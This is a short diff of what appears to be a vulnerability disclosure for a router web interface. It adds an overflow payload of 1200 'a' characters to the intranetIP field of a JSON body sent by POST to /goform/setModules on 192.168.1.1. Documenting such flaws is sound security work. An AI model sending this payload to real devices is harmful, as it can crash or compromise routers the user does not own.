@@ -26,7 +26,8 @@ IV：EU5H62G9ICGRNI43
 <img width="2188" height="662" alt="image" src="https://github.com/user-attachments/assets/152253f6-fc13-43c7-87b5-861ce482e82d" />
 Unencrypted data：
 
-{"intranetIP":"{overflowBuffer}","intranetPort":"80","extranetPort":"8080","protocol":"tcp"}}
+payload = 'a'*1200
+{"intranetIP":"{payload}","intranetPort":"80","extranetPort":"8080","protocol":"tcp"}}
 ```
 POST /;stok=a74261ba42fdea698945280e143761d2/goform/setModules?modules=portList HTTP/1.1
 Host: 192.168.1.1
